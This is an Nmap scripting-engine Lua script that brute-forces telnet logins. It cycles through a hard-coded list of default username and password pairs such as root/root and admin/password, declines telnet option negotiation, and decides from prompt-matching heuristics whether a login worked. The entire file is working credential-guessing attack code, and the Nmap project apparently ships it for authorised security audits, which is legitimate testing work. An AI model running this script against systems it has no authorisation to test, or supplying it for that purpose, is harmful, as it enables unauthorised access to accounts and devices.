--- Obtains the telnet login credentials on a server. This script
-- uses brute force techniques. 

id='bruteforce'
author = 'Eddie Bell <ejlbell@gmail.com>'
description='brute force telnet login credientials'
license = 'Same as Nmap--See http://nmap.org/book/man-legal.html'
categories = {'auth', 'intrusive'}

require('shortport')
require('stdnse')
require('strbuf')

local soc
local catch = function() soc:close() end
local try = nmap.new_try(catch)

portrule = shortport.port_or_service(23, 'telnet')

local escape_cred = function(cred) 
	if cred == '' then
		return '<blank>'
	else
		return cred 
	end
end

---
-- Returns a function which returns the next user/pass pair each time
-- it is called. When no more pairs are available nil is returned. 
-- \n
-- There are plenty more possible pairs but we need to find
-- a compromise between speed and coverage
--@return iterator Function which will return user and password pairs.
local new_auth_iter = function()
	local userpass = { 
		-- guest
		{'guest', ''}, {'guest', 'guest'}, {'guest', 'visitor'},

		-- root
		{'root', ''}, {'root', 'root'}, 
		{'root', 'pass'}, {'root', 'password'},

		-- admin
		{'admin', ''}, {'admin', 'admin'},
		{'admin', 'pass'}, {'admin', 'password'},

		-- adminstrator
		{'adminstrator', ''}, {'adminstrator', 'adminstrator'},
		{'adminstrator', 'password'}, {'adminstrator', 'pass'},
		
		-- others
		{'visitor', ''}, {'netman', 'netman'}, {'Admin', 'Admin'},
		{'manager', 'manager'}, {'security', 'security'},
		{'username', 'password'}, {'user', 'pass'}, 

		-- sentinel 
		{nil, nil}
	}

	local i = 1 
	return function(direction)
		if not userpass[i][1] then 
			return
		 end

		i = i + 1
		stdnse.print_debug(3, id .. " " .. 
				  userpass[i-1][1] .. ":" .. escape_cred(userpass[i-1][2]))
		return userpass[i-1][1], userpass[i-1][2]
	end
end

---
-- Go through telnet's option palaver so we can get to the login prompt.
-- We just deny every options the server asks us about.
local negotiate_options = function(result)
	local index, x, opttype, opt, retbuf

	index = 0
	retbuf = strbuf.new()

	while true do

		-- 255 is IAC (Interpret As Command)
		index, x = string.find(result, '\255', index)

		if not index then 
			break 
		end

		opttype = string.byte(result, index+1)
		opt = string.byte(result, index+2)

		-- don't want it! won't do it! 
		if opttype == 251 or opttype == 252 then
			opttype = 254
		elseif opttype == 253 or opttype == 254 then
			opttype = 252
		end

		retbuf = retbuf .. string.char(255)
		retbuf = retbuf .. string.char(opttype)
		retbuf = retbuf .. string.char(opt)
		index = index + 1
	end	
	soc:send(strbuf.dump(retbuf))
end

---
-- A semi-state-machine that takes action based on output from the
-- server. Through pattern matching, it tries to deem if a user/pass
-- pair is valid. Telnet does not have a way of telling the client
-- if it was authenticated....so we have to make an educated guess
local brute_line = function(line, user, pass, usent)

	if (line:find 'incorrect' or line:find 'failed' or line:find 'denied' or 
            line:find 'invalid' or line:find 'bad') and usent then
		usent = false
		return 2, nil, usent 

	elseif (line:find '[/>%%%$#]+' or line:find "last login%s*:" or
	        line:find '%u:\\') and not
	       (line:find 'username%s*:' and line:find 'login%s*:') and
	       usent then
		return 1, escape_cred(user) .. ' - ' .. escape_cred(pass)  .. '\n', usent
		
	elseif line:find 'username%s*:' or line:find 'login%s*:' then
		try(soc:send(user .. '\r\0'))
		usent = true

	elseif line:find 'password%s*:' or line:find 'passcode%s*:' then
		-- fix, add 'password only' support
		if not usent then return 1, nil, usent end
		try(soc:send(pass .. '\r\0'))
	end

	return 0, nil, usent
end

--[[
Splits the input into lines and passes it to brute_line()
so it can try to login with <user> and <pass>

return value: 
	(1, user:pass)	 - valid pair
	(2, nil) 	 - invalid pair
	(3, nil)  	 - disconnected and invalid pair
	(4, nil)  	 - disconnected and didn't send pair
--]]

local brute_cred = function(user, pass)
	local status, ret, value, usent, results

	usent = false ; ret = 0

	while true do
		status, results = soc:receive_lines(1)

		-- remote host disconnected
		if not status then 
			if usent then return 3 
			else return 4 
			end
		end

		if (string.byte(results, 1) == 255) then
			negotiate_options(results)
		end

		results = string.lower(results)

		for line in results:gmatch '[^\r\n]+' do 
			ret, value, usent = brute_line(line, user, pass, usent)
			if (ret > 0) then
				return ret, value
			end
		end
	end
	return 1, "error -> this should never happen"
end

action = function(host, port)
	local pair, status, auth_iter 
	local user, pass, count, rbuf
	
	pair = nil ; status = 3 ; count = 0
	auth_iter = new_auth_iter(); 

	soc = nmap.new_socket()
	soc:set_timeout(4000)

	-- continually try user/pass pairs (reconnecting, if we have to)
    -- until we find a valid one or we run out of pairs
	while not (status == 1) do

		if status == 2 or status == 3 then
			user, pass = auth_iter() 
		end

		-- make sure we don't get stuck in a loop
		if status == 4 then
			count = count + 1
			if count > 3 then return nil end
		else count = 0 end

		-- no more users left
		if not user then break end

		if status == 3 or status == 4 then
			try(soc:connect(host.ip, port.number, port.protocol))
		end

		status, pair = brute_cred(user, pass)
	end
	soc:close()
	return pair
end
